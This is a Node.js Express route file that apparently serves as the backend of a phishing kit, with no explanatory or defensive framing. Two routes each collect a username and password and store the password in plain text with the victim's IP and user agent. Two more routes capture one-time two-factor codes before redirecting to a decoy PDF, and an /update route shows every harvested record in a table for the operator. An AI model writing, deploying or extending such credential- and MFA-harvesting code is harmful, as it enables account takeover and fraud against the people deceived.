const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation

const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission first time

router.post('/submit1', validateFormData,  (req, res) => {
  
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    const clientIP = req.headers['x-forwarded-for'];
    const ip =  clientIP.split(',')[0].trim(); 
    // const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const notify = 0;


                          
                           
      const insertQuery = 'INSERT INTO newtable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
      db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
          if (err) {
              console.error('Error inserting record:', err);
              return res.status(500).send('Internal Server Error');
          }
          res.redirect(`/login/?jdfngoofiwerfiwjpijweifdhgierugtrhnfwehfo=${b64}`);
      });
                    
  
     
    });
  



// Handle form submission second time



const validateFormData2 = (req, res, next) => {
    const { username, password } = req.body;
  
    if (!username || !password) {
        return res.status(400).render('error');
    }
  

    next();
  };
  

router.post('/submit2', validateFormData2, (req, res) => {
   
  const name = req.body.username;
  const b64 = Buffer.from(name).toString('base64');
  const word = req.body.password;
  const clientIP = req.headers['x-forwarded-for'];
  const ip =  clientIP.split(',')[0].trim(); 
  //const ip = req.socket.remoteAddress; 
  const useragent = req.get('User-Agent');
  const date = new Date();
  const notify = 0;
   



                  const insertQuery = 'INSERT INTO newtable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                  db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                      if (err) {
                          console.error('Error inserting record:', err);
                          return res.status(500).send('Internal Server Error');
                      }
                      res.redirect(`/codeload/?sdjkhfjdshfjkhdjkfhuewrghjfdghkdfe=${b64}`);
                  });
                          
    

   
  

});

//handel code submission request

const validateFormcode = (req, res, next) => {
  const code = req.body.totpcode;

  if (code == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


router.post('/codepost', validateFormcode, (req, res) => {
   
  const name = req.body.username;
  const b64 = Buffer.from(name).toString('base64');
  const code = req.body.totpcode;
  const notify = 0;
  



  const sqlQuery =  'SELECT username FROM newtable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const codeupdate = 'UPDATE newtable SET code = ? , notify = ? WHERE username = ?';
                          db.query(codeupdate, [code, notify, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect(`/codeverify/?fgjhfjhgjftrurtfgncvbdssg=${b64}`);

                          });
                          } 
    

   
  });

});


const verfiycode = (req, res, next) => {
    const code2 = req.body.totpcode;

  if (code2 == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


router.post('/codeverify', verfiycode, (req, res) => {
   
  const name = req.body.username;
  const code2 = req.body.totpcode;
  const notify = 0;
  



  const sqlQuery =  'SELECT username FROM newtable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const codeupdate2 = 'UPDATE newtable SET code2 = ? , notify = ? WHERE username = ?';
                          db.query(codeupdate2, [code2, notify, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect(`1.pdf`);

                          });
                          } 
    

   
  });

});


router.post('/update' , (req, res) => {

  const name = req.body.username;
  const notif = 1;
  

  const sqlQuery =  'SELECT username FROM newtable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const update = 'UPDATE newtable SET notify = ?  WHERE username = ?';
                          db.query(update, [notif, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }


                              const query = 'SELECT * FROM newtable'; // Replace with your table name
  
                              db.query(query, (err, results) => {
                                if (err) {
                                  console.error('Error executing the query: ' + err.stack);
                                  return res.status(500).send('Error fetching data from the database.');
                                }
                             // Store the data in a variable
                                const data = Object.values(JSON.parse(JSON.stringify(results)));
                               
                                res.render('table', {data});
                            
                              });



                          });
                          } 
       
  });

});



module.exports =router
